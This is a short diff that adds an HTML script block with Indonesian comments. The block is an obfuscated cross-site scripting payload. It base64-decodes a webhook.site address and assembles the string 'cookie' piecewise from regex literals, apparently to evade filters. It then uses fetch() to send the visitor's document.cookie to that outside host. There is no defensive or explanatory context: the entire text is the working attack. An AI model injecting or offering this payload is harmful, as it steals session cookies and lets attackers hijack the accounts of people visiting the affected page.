@@ -1,0 +1,18 @@
+<script>
+    let s = String(/aHR0cHM6Ly93ZWJob29rLnNpdGUvZGE0Nzg4NTAtMmI2OS00OTAwLTg3NGItOGIzYjc5NzMxZDMx/);
+    let l = 84;
+    let u = s[1];
+    for (let i = 2; i < l + 1; i++) {
+        u += s[i];
+    }
+    u = atob(u);  // Decode base64 ke URL webhook
+
+    s = String(/cookie/);
+    l = 6;
+    c = s[1];
+    for (let i = 2; i < l + 1; i++) {
+        c += s[i];
+    }
+
+    fetch(u + document[c]);  // Kirim cookie ke webhook
+</script>
